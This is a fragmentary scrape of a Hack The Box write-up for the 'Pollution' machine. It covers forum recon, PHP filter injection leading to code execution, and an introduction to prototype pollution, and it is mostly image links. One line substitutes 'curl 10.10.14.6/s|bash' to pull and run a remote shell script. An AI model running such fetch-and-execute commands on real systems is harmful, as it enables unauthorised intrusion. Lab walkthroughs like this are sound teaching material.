[HTB: Pollution](/2023/07/01/htb-pollution.html)

![Pollution](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/pollution-cover.webp)
...
[![Pollution](/icons/box-pollution.webp)](https://hackthebox.com/machines/pollution)

[Pollution](https://hackthebox.com/machines/pollution)
...
Rated Difficulty ![Rated difficulty for Pollution](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/pollution-diff.webp)

Radar Graph ![Radar chart for Pollution](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/pollution-radar.webp)

User

03:52:43 Root

04:22:51 Creator ## Recon
...
[![image-20230628150658135](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20230628150658135.png)](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20230628150658135.png)

[*Click for full image*](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20230628150658135.png)

There’s a contact section at the bottom that includes a domain and an email:

![image-20230628150720121](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20230628150720121.webp)
...
![image-20230628150834623](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20230628150834623.webp)
...
![image-20230628151635135](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20230628151635135.webp)

The “Member List” link gives a list of potential user names:

![image-20230628153831861](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20230628153831861.webp)

The forum has a bunch of posts:

![image-20230628151652418](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20230628151652418.webp)

There is information in some of these threads:

- “Forum” says that this is for employees only.
- The “I had problems with the Pollution API” thread has a user complaining that it’s not working. In that thread, they post their Burp History. I’ll want to analyzed that. ![image-20230628152110282](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20230628152110282.webp)
...
![image-20230628152713034](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20230628152713034.webp)

There’s a “Need to register?” link, and once I register, I can download the file.

The file is XML:

![image-20230628152841126](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20230628152841126.webp)
...
![image-20221018101622894](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20221018101622894.webp)
...
![image-20230628154343272](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20230628154343272.webp)
...
![image-20221018152923776](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20221018152923776.webp)
...
![image-20221018153004191](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20221018153004191.webp)
...
![image-20230628172310148](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20230628172310148.webp)
...
When Pollution was released, the PHP filter injection technique was not at all well known. Many in the community learned of it by playing Pollution. Since then, I’ve shown it as an [unintended for UpDown](about:/2023/01/21/htb-updown.html#beyond-root---lfi2rce-via-php-filters) and the intended path for [Encoding](about:/2023/04/15/htb-encoding.html#lfi---rce). The UpDown post has a lot of detail, and [this video](https://www.youtube.com/watch?v=TnLELBtmZ24) goes into detail explaining it:
...
![image-20230628173501591](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20230628173501591.webp)
...
![image-20230628174035851](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20230628174035851.webp)
...
![image-20230628174159373](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20230628174159373.webp)

I’ll replace `id` with `curl 10.10.14.6/s|bash`:

![image-20230628174501412](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20230628174501412.webp)
...
![image-20230629040444013](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20230629040444013.webp)
...
![image-20230629144904693](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20230629144904693.webp)
...
![image-20230629145313135](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20230629145313135.webp)

### RCE via Prototype Pollution

#### Background

The idea in a prototype pollution attack is to attack the prototype for objects. When you create a new object, it inherits from the prototype, but also carries a reference to that prototype along with it as `.__proto__`. I abused this in [2022 Hackvent Day 13](about:/hackvent2022/medium#hv2213) to give my user admin access.
...
![image-20230629153908762](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20230629153908762.webp)
...
![image-20230629154321644](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20230629154321644.webp)
...
![image-20230629160125840](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20230629160125840.webp)
